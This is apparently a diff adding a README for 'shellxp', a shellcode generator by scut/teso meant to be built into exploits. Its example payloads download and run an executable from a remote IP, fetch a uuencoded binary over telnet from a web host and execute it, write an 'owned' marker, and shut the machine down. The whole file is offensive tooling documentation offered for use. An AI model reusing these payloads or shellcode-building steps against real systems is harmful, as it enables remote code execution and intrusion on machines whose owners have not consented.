@@ -1,0 +1,38 @@
+
+gcc -o shellxp shellxp.c
+
+./shellxp commands ...
+
+or to exec the generated shellcode
+
+./shellxp exec commands ...
+
+
+either rip the sc_build routine into your exploits to directly create the
+shellcode on the fly, or prepare it.
+
+some examples:
+
+./shellxp /bin/sh -c "lynx -source 1.1.1.1/a>a;chmod +x a;./a"
+./shellxp /bin/sh -c "echo haha > /tmp/owned"
+./shellxp /sbin/shutdown -h now
+
+or especially fancy ;-)
+
+./shellxp /bin/sh -c "((echo GET /test/ HTTP/1.0;echo;sleep 5)|telnet www.foo.org 80)|uudecode;/tmp/run.sh"
+
+   (where /test/index.html is an uuencoded file that will uudecode to an executeable /tmp/run.sh file)
+   modify the "sleep 5" to an appropiate value to allow the file to get retrieved :-)
+
+(imagine some other fancy stuff in here :-)
+...
+
+-scut/teso.
+
+
+to modify the shellcode, use:
+
+gcc -o shellcode shellcode.c sc.s
+./shellcode      <-- will dump the code
+./shellcode foo  <-- will dump and run the code
+
